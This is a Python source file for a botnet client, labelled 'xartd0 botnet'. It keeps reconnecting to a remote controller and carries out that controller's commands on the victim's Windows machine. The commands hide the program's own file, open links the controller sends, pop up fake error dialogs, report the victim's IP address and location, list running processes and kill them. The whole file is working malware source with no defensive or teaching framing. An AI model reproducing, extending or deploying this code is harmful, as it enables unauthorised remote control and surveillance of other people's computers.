from imports import *



help_message = '''  ├ Help
  └ open-link (link)
    └ invisible (make the file hidden)
      └ error (message) (send an error message)
        └ exit (close client)
          └ help (help menu)
            └ ip-info (information about client ip)
              └ pids (list of client proccesses)
                └ kill (PID) (kill proccess by PID)
            '''
def server_control():
    try:
        while True:
            command = s.recv(1024).decode()
            print(command)
            if 'error' in command:
                s.send('  └─▷ The message was sent successfully'.encode())
                ctypes.windll.user32.MessageBoxW(0, command.partition(' ')[2], "xartd0 botnet", 16)
            elif command == 'exit':
                s.send('  └─▷ Session was successfully closed'.encode())
                s.close()
                exit(0)
            elif command == 'invisible':
                s.send(f'  └─▷ {sys.argv[0]} was successfully hidden'.encode())
                subprocess.check_call(["attrib","+H",sys.argv[0]])
            elif 'open-link' in command:
                s.send(f'  └─▷ {command.split(" ")[1]} has been successfully opened'.encode())
                webbrowser.open(command.split(' ')[1])
            elif command == 'help':
                s.send(help_message
                .encode())
            elif command == 'ip-info':
                response = requests.get(f'http://ip-api.com/json/').json()
                s.send(f'''  ├ Ip: {response["query"]}
    └ Country: {response["country"]}
        └ City: {response["regionName"]}
        └ Zip-code: {response["zip"]}
            └ Isp: {response["isp"]}'''.encode())
            elif command == 'pids':
                proccesses = ''
                for proc in psutil.process_iter():
                    try:
                        proccesses += f"{proc.name()}:{proc.pid}\n"
                    except:
                        pass
                s.send(proccesses.encode())
            elif 'kill' in command:
                print(command.split(' ')[1])
                os.system(f"taskkill /F /PID {command.split(' ')[1]}")
                s.send(f'  └─▷ {command.split(" ")[1]} was successfully killed'.encode())
            else:
                s.send(f'  └─▷ Command not found!\n{help_message}'.encode())
            
    except Exception as e:
        print(e)
        s.close()
        setup_bot()


def setup_bot():
    global s
    s = socket.socket()
    while True:
        try:
            time.sleep(10)
            print('Reconnecting...')
            s.connect((HOST_CLIENT, PORT))
            server_control()
            break
        except Exception as e:
            print(e)
            continue

setup_bot()
